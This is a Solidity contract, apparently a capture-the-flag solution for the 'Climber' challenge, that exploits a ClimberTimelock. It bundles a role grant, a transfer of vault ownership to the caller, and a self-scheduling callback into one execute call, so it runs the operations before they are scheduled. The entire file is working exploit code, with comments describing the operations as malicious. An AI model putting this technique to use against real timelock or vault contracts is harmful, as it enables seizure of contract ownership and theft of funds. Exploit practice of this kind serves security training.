// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";

/**
 * @title ClimberAttacker
 * @dev This contract is used to exploit the ClimberTimelock contract by scheduling and executing malicious operations.
 */
contract ClimberAttacker {
    address payable private immutable timelock;
    uint256[] private _values = [0, 0, 0];
    address[] private _targets = new address[](3);
    bytes[] private _elements = new bytes[](3);

    /**
     * @dev Sets up the attacker contract with the timelock and vault addresses.
     * @param _timelock The address of the ClimberTimelock contract.
     * @param _vault The address of the ClimberVault contract.
     */
    constructor(address payable _timelock, address _vault) {
        timelock = _timelock;
        _targets = [_timelock, _vault, address(this)];

        _elements[0] = (
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
        );
        _elements[1] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
        _elements[2] = abi.encodeWithSignature("timelockSchedule()");
    }

    /**
     * @dev Executes the scheduled malicious operations on the ClimberTimelock contract.
     */
    function timelockExecute() external {
        ClimberTimelock(timelock).execute(_targets, _values, _elements, bytes32("anySalt"));
    }

    /**
     * @dev Schedules the malicious operations on the ClimberTimelock contract.
     */
    function timelockSchedule() external {
        ClimberTimelock(timelock).schedule(_targets, _values, _elements, bytes32("anySalt"));
    }
}
